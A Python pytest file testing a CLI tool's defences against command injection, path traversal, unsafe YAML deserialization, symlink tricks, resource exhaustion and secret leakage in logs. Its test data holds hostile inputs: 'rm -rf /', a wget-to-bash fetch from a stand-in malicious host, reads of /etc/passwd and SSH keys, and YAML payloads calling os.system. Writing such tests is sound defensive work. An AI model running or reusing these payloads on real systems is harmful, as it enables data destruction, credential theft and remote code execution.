"""
Security Validation Tests for CLI Commands.

Tests targeting potential security vulnerabilities and input validation issues
identified through code quality analysis. Focuses on injection attacks,
path traversal, and unsafe operations.
"""

import argparse
import logging
import os
import tempfile
from pathlib import Path
from unittest.mock import MagicMock, Mock, mock_open, patch

import pytest

from tests.unit.test_cli.base_cli_test import ComprehensiveCLITest


class TestInputValidationSecurity(ComprehensiveCLITest):
    """Test input validation for security vulnerabilities."""

    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks."""
        from panther.cli.subcommands.tools import ToolsCommand

        # Test command injection attempts in subprocess calls
        malicious_inputs = [
            "; rm -rf /",
            "& whoami",
            "| cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "; wget http://malicious.com/script.sh | bash",
        ]

        for malicious_input in malicious_inputs:
            with patch("subprocess.run") as mock_subprocess:
                mock_subprocess.return_value = MagicMock(
                    returncode=0, stdout="", stderr=""
                )

                # Test various entry points that use subprocess
                args = self.create_namespace(
                    tools_action="list", malicious_param=malicious_input
                )

                result = ToolsCommand._list_tools(args)

                # Should not execute malicious commands
                # Verify subprocess.run is called with safe parameters
                if mock_subprocess.called:
                    for call in mock_subprocess.call_args_list:
                        call_args = str(call)
                        assert "rm -rf" not in call_args
                        assert "wget" not in call_args
                        assert "bash" not in call_args

    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        from panther.cli.subcommands.config import ConfigCommand

        # Test path traversal attempts
        path_traversal_attempts = [
            "../../etc/passwd",
            "../../../root/.ssh/id_rsa",
            "..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "~/.ssh/authorized_keys",
            "../../../../../../../etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
        ]

        for malicious_path in path_traversal_attempts:
            with patch("pathlib.Path.exists", return_value=False):
                args = self.create_namespace(
                    config_action="validate", config=malicious_path
                )

                result = ConfigCommand._handle_validate(args)

                # Should reject malicious paths
                assert result == 1  # Should fail validation

    def test_file_upload_security(self):
        """Test security of file upload/creation operations."""
        from panther.cli.subcommands.create import CreateCommand

        # Test malicious file names
        malicious_filenames = [
            "../../../etc/passwd",
            "\\..\\..\\..\\windows\\system32\\config\\sam",
            "/dev/null",
            "/tmp/../etc/passwd",
            "config\x00.yaml",  # Null byte injection
            "config.yaml\x00.exe",
        ]

        for malicious_filename in malicious_filenames:
            with patch("builtins.open", mock_open()) as mock_file, patch(
                "pathlib.Path.mkdir"
            ) as mock_mkdir, patch("pathlib.Path.exists", return_value=False):
                args = self.create_namespace(
                    create_action="config",
                    name="test",
                    output=malicious_filename,
                    type="minimal",
                )

                result = CreateCommand._handle_create_config(args)

                # Should handle malicious filenames safely
                if mock_file.called:
                    # Verify the actual path used is safe
                    actual_path = str(mock_file.call_args)
                    assert "/etc/passwd" not in actual_path
                    assert "system32" not in actual_path

    def test_environment_variable_injection(self):
        """Test prevention of environment variable injection."""
        from panther.cli.subcommands.admin import AdminCommand

        # Test malicious environment variable injection
        malicious_env_values = [
            "normal_value; export MALICIOUS=dangerous",
            "value`whoami`",
            "value$(id)",
            "value\nMALICIOUS=dangerous\nexport MALICIOUS",
        ]

        for malicious_value in malicious_env_values:
            with patch("subprocess.run") as mock_subprocess, patch.dict(
                "os.environ", {"TEST_VAR": malicious_value}
            ):
                mock_subprocess.return_value = MagicMock(
                    returncode=0, stdout="", stderr=""
                )

                args = self.create_namespace(
                    admin_action="docker", docker_action="status"
                )

                result = AdminCommand._handle_docker(args)

                # Should not propagate malicious environment variables
                if mock_subprocess.called:
                    for call in mock_subprocess.call_args_list:
                        call_str = str(call)
                        assert "MALICIOUS" not in call_str

    def test_yaml_injection_prevention(self):
        """Test prevention of YAML injection attacks."""
        from panther.cli.subcommands.config import ConfigCommand

        # Test YAML injection payloads
        yaml_injection_payloads = [
            "!!python/object/apply:os.system ['id']",
            "!!python/object/apply:subprocess.Popen [['whoami']]",
            "!!python/object/new:os.system ['rm -rf /']",
            '- !!python/object/apply:eval [\'__import__("os").system("id")\']',
        ]

        for payload in yaml_injection_payloads:
            with patch(
                "builtins.open", mock_open(read_data=payload)
            ) as mock_file, patch("pathlib.Path.exists", return_value=True), patch(
                "panther.cli.subcommands.config.ConfigLoader"
            ) as mock_loader:
                mock_loader_instance = MagicMock()
                mock_loader_instance.load_and_validate_experiment_config.side_effect = (
                    Exception("Invalid YAML")
                )
                mock_loader.return_value = mock_loader_instance

                args = self.create_namespace(
                    config_action="validate", config="malicious.yaml"
                )

                result = ConfigCommand._handle_validate(args)

                # Should reject malicious YAML
                assert result == 1

    def test_symlink_attack_prevention(self):
        """Test prevention of symlink attacks."""
        from panther.cli.subcommands.admin import AdminCommand

        with patch("pathlib.Path.is_symlink", return_value=True), patch(
            "pathlib.Path.exists", return_value=True
        ):
            args = self.create_namespace(
                admin_action="clean", target_path="/tmp/symlink_to_important_file"
            )

            # Should detect and handle symlinks safely
            # Most commands should either reject symlinks or resolve them safely
            result = AdminCommand._handle_clean(args)
            assert result in [0, 1]  # Should not crash


class TestPermissionAndAccessControl(ComprehensiveCLITest):
    """Test permission and access control security."""

    def test_privilege_escalation_prevention(self):
        """Test prevention of privilege escalation."""
        from panther.cli.subcommands.tools import ToolsCommand

        # Test operations that might require elevated privileges
        with patch("subprocess.run") as mock_subprocess:
            # Simulate permission denied
            mock_subprocess.side_effect = PermissionError("Permission denied")

            args = self.create_namespace(tools_action="install-slim", force=True)

            result = ToolsCommand._install_slim(args)

            # Should handle permission errors gracefully
            assert result == 1

    def test_file_permission_validation(self):
        """Test validation of file permissions."""
        from panther.cli.subcommands.config import ConfigCommand

        # Test with file that exists but is not readable
        with patch("pathlib.Path.exists", return_value=True), patch(
            "builtins.open", side_effect=PermissionError("Permission denied")
        ):
            args = self.create_namespace(
                config_action="validate", config="restricted.yaml"
            )

            result = ConfigCommand._handle_validate(args)

            # Should handle permission errors gracefully
            assert result == 1

    def test_directory_traversal_protection(self):
        """Test protection against directory traversal in file operations."""
        from panther.cli.subcommands.admin import AdminCommand

        # Test directory traversal attempts in cleanup operations
        traversal_paths = [
            "../../../important_system_files",
            "../../.ssh",
            "../../../etc",
            "../../../../root",
        ]

        for path in traversal_paths:
            with patch("pathlib.Path.exists", return_value=True), patch(
                "shutil.rmtree"
            ) as mock_rmtree:
                args = self.create_namespace(
                    admin_action="clean", path=path, force=True
                )

                result = AdminCommand._handle_clean(args)

                # Should not allow traversal outside safe directories
                if mock_rmtree.called:
                    actual_path = str(mock_rmtree.call_args[0][0])
                    assert "/etc" not in actual_path
                    assert "/root" not in actual_path
                    assert "/.ssh" not in actual_path


class TestResourceExhaustionProtection(ComprehensiveCLITest):
    """Test protection against resource exhaustion attacks."""

    def test_memory_exhaustion_protection(self):
        """Test protection against memory exhaustion attacks."""
        from panther.cli.subcommands.plugins import PluginsCommand

        # Test with extremely large plugin data
        with patch("panther.cli.subcommands.plugins.PluginManager") as mock_manager:
            # Create a large number of fake plugins
            large_plugin_list = [
                MagicMock(
                    name=f"plugin_{i}",
                    type="iut",
                    version="1.0",
                    description="x" * 10000,  # Large description
                )
                for i in range(1000)
            ]

            mock_manager_instance = MagicMock()
            mock_manager_instance.get_plugins_by_type.return_value = large_plugin_list
            mock_manager.return_value = mock_manager_instance

            args = self.create_namespace(format="table", type="all")

            # Should handle large datasets without crashing
            result = PluginsCommand._handle_list(args)
            assert result in [0, 1]

    def test_disk_space_exhaustion_protection(self):
        """Test protection against disk space exhaustion."""
        from panther.cli.subcommands.create import CreateCommand

        # Test with extremely large template generation
        with patch("builtins.open", mock_open()) as mock_file:
            # Simulate disk full error
            mock_file.side_effect = OSError("No space left on device")

            args = self.create_namespace(
                create_action="config",
                name="test",
                type="advanced",
                output="large_config.yaml",
            )

            result = CreateCommand._handle_create_config(args)

            # Should handle disk space errors gracefully
            assert result == 1

    def test_cpu_exhaustion_protection(self):
        """Test protection against CPU exhaustion through infinite loops."""
        from panther.cli.subcommands.check import CheckCommand

        # Test with operations that might cause high CPU usage
        with patch("subprocess.run") as mock_subprocess:
            # Simulate long-running process
            import time

            def slow_subprocess(*args, **kwargs):
                time.sleep(0.1)  # Simulate slow operation
                return MagicMock(returncode=0, stdout="", stderr="")

            mock_subprocess.side_effect = slow_subprocess

            args = self.create_namespace(
                check_lint=True, check_type=True, check_security=True
            )

            # Should complete in reasonable time
            import time

            start_time = time.time()
            result = CheckCommand.handle(args)
            end_time = time.time()

            # Should not take too long
            assert end_time - start_time < 5.0  # 5 second timeout
            assert result in [0, 1]


class TestSecureConfigurationHandling(ComprehensiveCLITest):
    """Test secure handling of configuration files and sensitive data."""

    def test_sensitive_data_exposure_prevention(self):
        """Test prevention of sensitive data exposure in logs."""
        from panther.cli.subcommands.admin import AdminCommand

        # Test with configuration containing sensitive data
        sensitive_config = {
            "password": "secret123",
            "api_key": "sk-1234567890abcdef",
            "private_key": "-----BEGIN PRIVATE KEY-----",
            "token": "ghp_xxxxxxxxxxxxxxxxxxxx",
        }

        with patch("logging.info") as mock_log, patch(
            "subprocess.run"
        ) as mock_subprocess:
            mock_subprocess.return_value = MagicMock(
                returncode=0, stdout=str(sensitive_config), stderr=""
            )

            args = self.create_namespace(admin_action="status", format="detailed")

            result = AdminCommand._handle_status(args)

            # Check that sensitive data is not logged
            for call in mock_log.call_args_list:
                log_message = str(call)
                assert "secret123" not in log_message
                assert "sk-1234567890abcdef" not in log_message
                assert "-----BEGIN PRIVATE KEY-----" not in log_message
                assert "ghp_xxxxxxxxxxxxxxxxxxxx" not in log_message

    def test_secure_temporary_file_handling(self):
        """Test secure handling of temporary files."""
        from panther.cli.subcommands.tools import ToolsCommand

        # Test temporary file creation with secure permissions
        with patch("tempfile.NamedTemporaryFile") as mock_temp:
            mock_temp_file = MagicMock()
            mock_temp_file.name = "/tmp/secure_temp_file"
            mock_temp.return_value.__enter__.return_value = mock_temp_file

            args = self.create_namespace(tools_action="install-precommit", update=True)

            with patch("subprocess.run") as mock_subprocess, patch(
                "pathlib.Path.cwd", return_value=Path("/safe/directory")
            ), patch("pathlib.Path.exists", return_value=True):
                mock_subprocess.return_value = MagicMock(
                    returncode=0, stdout="", stderr=""
                )

                result = ToolsCommand._install_precommit(args)

                # Should handle temporary files securely
                assert result in [0, 1]

    def test_configuration_validation_bypass_prevention(self):
        """Test prevention of configuration validation bypass."""
        from panther.cli.subcommands.config import ConfigCommand

        # Test attempts to bypass validation
        bypass_attempts = [
            {
                "strict": False,
                "fix_issues": True,
            },  # Try to auto-fix without strict validation
            {"format": "json"},  # Try different format to bypass checks
        ]

        for attempt in bypass_attempts:
            with patch(
                "panther.cli.subcommands.config.ConfigLoader"
            ) as mock_loader, patch("pathlib.Path.exists", return_value=True):
                mock_loader_instance = MagicMock()
                # Simulate invalid config that should fail validation
                mock_loader_instance.load_and_validate_experiment_config.side_effect = (
                    ValueError("Invalid config")
                )
                mock_loader.return_value = mock_loader_instance

                args = self.create_namespace(
                    config_action="validate", config="invalid.yaml", **attempt
                )

                result = ConfigCommand._handle_validate(args)

                # Should not allow bypass of validation
                assert result == 1
